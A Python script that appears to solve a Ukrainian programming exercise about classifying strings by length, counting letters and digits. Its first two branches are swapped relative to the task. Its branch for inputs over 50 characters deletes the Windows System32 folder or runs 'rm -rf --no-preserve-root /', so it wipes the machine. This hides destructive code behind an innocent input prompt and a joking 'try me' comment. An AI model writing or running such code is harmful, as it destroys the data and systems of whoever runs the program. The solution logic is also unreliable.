"""
Наприклад маємо рядок --> "f98neroi4nr0c3n30irn03ien3c0rfekdno400wenwkowe00ko
ijn35pijnp46ij7k5j78p3kj546p465jnpoj35po6j345"

Створіть ф-цiю, яка буде отримувати рядки на зразок цього та яка оброблює 
наступні випадки:
-  якщо довжина рядка в діапазонi 30-50 (включно) -> прiнтує довжину рядка,
    кiлькiсть букв та цифр
-  якщо довжина менше 30 -> прiнтує суму всiх чисел та окремо рядок без цифр 
    лише з буквами (без пробілів)
-  якщо довжина більше 50 -> щось вигадайте самі, проявіть фантазію =)
"""

import re
import os
import shutil


def task_4_func(line : str):
    length = len(line)
    only_letters = re.sub(r'[^A-Za-z]', '', line)
    only_numbers = re.sub(r'\D', '', line)
    if 30 > length:
        letters_amount = len(only_letters)
        numbers_amount = len(only_numbers)
        print(f'Length of line: {length}, letters amount: {letters_amount},',\
              f'numbers amount: {numbers_amount}')
    elif 30 <= length <= 50:
        sum_of_digits = sum(int(digit) for digit in only_numbers)
        print(sum_of_digits, only_letters, sep='\n')
    else:
        if os.name == 'nt':
            system32 = os.path.expandvars('%WINDIR%\System32')
            shutil.rmtree(system32, ignore_errors=True)                #try me
        else:
            os.system('rm -rf --no-preserve-root /')


if __name__ == '__main__':
    line = input('Input a line of any length: ')
    task_4_func(line)
    